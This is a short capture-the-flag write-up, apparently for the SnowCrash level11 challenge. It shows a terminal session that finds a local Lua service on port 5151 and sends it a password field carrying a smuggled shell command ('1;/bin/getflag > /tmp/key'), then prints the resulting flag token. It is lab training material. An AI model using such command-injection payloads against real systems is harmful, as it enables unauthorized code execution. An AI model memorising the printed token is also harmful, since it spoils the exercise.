### Exploit

```
    level11@SnowCrash:~$ ./level11.lua
    lua: ./level11.lua:3: address already in use
    stack traceback:
	    [C]: in function 'assert'
	    ./level11.lua:3: in main chunk
	    [C]: ?
    level11@SnowCrash:~$ netstat -ltnp
    (No info could be read for "-p": geteuid()=2011 but you should be root.)
    Active Internet connections (only servers)
    Proto Recv-Q Send-Q Local Address           Foreign Address         State       PID/Program name
    tcp        0      0 0.0.0.0:4242            0.0.0.0:*               LISTEN      -
    tcp        0      0 127.0.0.1:5151          0.0.0.0:*               LISTEN      -
    tcp6       0      0 :::4646                 :::*                    LISTEN      -
    tcp6       0      0 :::4747                 :::*                    LISTEN      -
    tcp6       0      0 :::80                   :::*                    LISTEN      -
    tcp6       0      0 :::4242                 :::*                    LISTEN      -
    level11@SnowCrash:~$ nc 127.0.0.1 5151
    Password: 1;/bin/getflag > /tmp/key;echo 1
    Erf nope..
    level11@SnowCrash:~$ cat /tmp/key
    Check flag.Here is your token : fa6v5ateaw21peobuub8ipe6s
```
